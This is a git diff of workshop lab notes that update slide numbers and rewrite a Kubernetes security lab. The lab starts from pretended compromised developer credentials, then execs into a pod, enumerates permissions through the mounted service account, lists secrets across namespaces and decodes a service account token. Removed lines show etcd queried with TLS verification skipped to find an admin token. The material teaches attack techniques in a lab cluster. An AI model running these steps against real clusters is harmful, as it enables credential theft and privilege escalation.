@@ -528,23 +528,35 @@ docker container prune
 
 ## Module 6 - The Basics of using K8S
 
-### Slide 100 - Creating a namespace
+### Slide 96 - Try out kubectl
+
+```
+kubectl get nodes
+```
+
+### Slide 97 - Namespaces
+
+```
+kubectl get namespaces
+```
+
+### Slide 98 - Creating a namespace
 
 ```
 kubectl create namespace lab-namespace
 ```
 
 ```
-kubectl get namespace
+kubectl get namespaces
 ```
 
-### Slide 103 - Accessing a cluster
+### Slide 101 - Accessing a cluster
 
 ```
 kubectl cluster-info
 ```
 
-### Slide 105 - Display pods
+### Slide 103 - Display pods
 
 ```
 kubectl get pods
@@ -565,7 +577,7 @@ Describe (get more details) on a pod
 kubectl -n kube-system describe pod <name>
 ```
 
-### Slide 107 - Run first pod
+### Slide 105 - Babby's first pod
 
 ```
 wget https://k8s.io/examples/pods/simple-pod.yaml
@@ -597,61 +609,114 @@ kubectl get pod nginx -o wide --namespace lab-namespace
 
 ## Module 7 - Kubernetes Security
 
-### Slide XXX - Setup Kubernetes labs
+### Slide 120 - Lab Setup
 
 ```
 ansible k8s-ansible-setup.yml
 ```
 
+
+### Slide 123 - Lab Scenario
+
+By now your Ansible playbook should have finished with no errors, if so great, if not, get our TA's attention.
+
+We need the to pretend we've compromised dev creds to Kubernetes, we'll do this by switching kubectl's context (contexts are often used when kubectl users have multiple clusters or accounts)
 ```
-kubectl get namespace
+kubectl config use-context developer@kind-lab
 ```
 
+### Slide 124 - Priv esc - to golden tickets (lab)
 
-### Slide 126 - Priv esc - to golden tickets (lab)
-
-We need the IP for the cluster, going to get it from Docker container for the control plane and assign it to a shell env variable
+What can it do?
 ```
-export CLUSTERIP1=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' etcdnoauth-control-plane)
-```
-This is needed for etcdctl to work
-```
-export ETCDCTL_API=3
+kubectl auth can-i --list
 ```
 
+Permissions on dev account seem to be very limited
 ```
-etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get / --prefix --keys-only
+kubectl get pods
+```
+There's one pod we seem to have access to...
+
+Let's exec into it. Change the `[rand]` below to match the random string in the pod name from the last command
+```
+kubectl exec -it myapp-[rand] -- /bin/bash
 ```
 
-Let's go after the admin token
-```
-etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 \
-get / --prefix --keys-only |grep admins-account-token
-```
-Make note of the random string at the end of the token name, you'll need it later
+### Slide 125 - Priv esc - to golden tickets (lab cont.)
 
-### Slide 124 - Priv esc - to golden tickets (lab continued)
+Install some tools we'll need
 
-Install some utilities
+**Note:** we can do this because we're running in the container as root, otherwise we'd just pull in these tools some other way
+
 ```
 apt update && apt install -y curl
 ```
-Download and install kubectl into the container
+
 ```
 curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
 ```
 
+chmod `kubectl`  and move it to /usr/local/bin 
+
 ```
-chmod +x kubectl && mv /usr/local/bin/
+chmod +x kubectl && mv kubectl /usr/local/bin
+```
+
+Use kubectl to see what we can do from this pod?
+
+```
+kubectl auth can-i --list
+```
+### Slide 126 - Priv esc - Why does this work?
+
+Look at the pod's service account K8S mounts inside the container
+
+```
+ls -l /var/run/secrets/kubernetes.io/serviceaccount/
+```
+
+### Slide 127 - Priv esc - to golden tickets (lab cont.)
+
+Get secrets
+
+```
+kubectl get secrets
+```
+
+Not much there, lets see if we can see secrets outside our namespace?
+
+```
+kubectl get secrets --all-namespaces
+```
+
+One of these looks interesting...
+
+```
+kubectl get secrets -n tracee-system | grep security
+```
+
+Let's try and get the service account token stored in this secret
+```
+kubectl -n tracee-system get secret security-svc-token -o json
+```
+
+For this command we used `-o json`, hence the output details in json, some cases makes it easier to parse
+
+### Slide 129 - Priv esc - to golden tickets (lab cont.)
+
+we need to get the token in a form we can use
+
+```
+export TOKEN=$(kubectl -n tracee-system get secret security-svc-token -o=jsonpath="{.data.token}" | base64 -d)
+```
+
+```
+kubectl auth can-i --list
 ```
 
 
 
-```
-vim token.txt
-```
-
-Paste the contents of the token you copied above by hitting `i`, then pasting.
 
 When done, `[ESC]` to exit insert mode, then type `:` to bring up vim prompt, and type `wq` and press `[ENTER]` to issue the write to file and quit commands to vi
 
